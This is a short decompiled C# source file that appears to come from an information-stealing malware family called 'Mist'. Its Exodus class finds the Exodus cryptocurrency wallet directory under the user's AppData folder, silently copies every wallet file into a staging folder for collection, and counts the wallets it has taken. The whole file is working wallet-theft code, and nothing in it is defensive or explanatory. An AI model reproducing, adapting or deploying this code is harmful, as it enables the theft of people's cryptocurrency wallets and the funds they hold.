using System;
using System.IO;

namespace Mist
{
	// Token: 0x0200006B RID: 107
	internal class Exodus
	{
		// Token: 0x06000294 RID: 660 RVA: 0x00012780 File Offset: 0x00010980
		public static void ExodusStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Exodus.ExodusDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Exodus.ExodusDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
						fileInfo.CopyTo(directorypath + Exodus.ExodusDir + fileInfo.Name);
					}
					Exodus.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000164 RID: 356
		public static int count = 0;

		// Token: 0x04000165 RID: 357
		public static string ExodusDir = "\\Wallets\\Exodus\\";

		// Token: 0x04000166 RID: 358
		public static string ExodusDir2 = Help.AppDate + "\\Exodus\\exodus.wallet\\";
	}
}
